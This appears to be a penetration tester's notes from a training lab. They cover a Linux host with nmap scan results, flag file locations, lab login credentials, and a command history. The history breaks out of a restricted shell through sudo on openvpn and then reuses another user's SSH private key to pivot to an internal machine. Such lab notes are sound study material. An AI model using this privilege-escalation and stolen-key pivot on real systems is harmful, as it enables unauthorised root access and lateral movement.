# 192.168.x.122
# Summary
- 
# Flag Location
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`
- /home/offsec/local.txt
- /root/proof.txt
# Accounts
### offsec / password
`<ssh offsec@192.168.213.122>`
```
restricted shell
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.159.122 --top-ports 1000`    
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
`sudo nmap -A -T4 -p- 192.168.213.122`
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  openvpn?
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   83.07 ms 192.168.45.1
2   83.05 ms 192.168.45.254
3   88.40 ms 192.168.251.1
4   88.47 ms 192.168.213.122
```
## Local Users
`Get-LocalUser`
```

```
## Local Groups
`Get-LocalGroup`
```
```
## System Info
`systeminfo`
```

```
## Routes
`route print`
```
```
## Netstat
`netstat -ano`
```
```
## Environment Vars
`Get-ChildItem Env:`
```
```
## Domain Controller Info
`nltest /dsgetdc:secura`
```
```
# Services    


## Command History
```c
    sudo -l
    gtfobins.github.io
    search openvpn

    // break out of restricted shell
    sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'

    //find id_rsa under /home/mario/.ssh
    ssh -i /home/mario/.ssh/id_rsa mario@172.16.152.14
```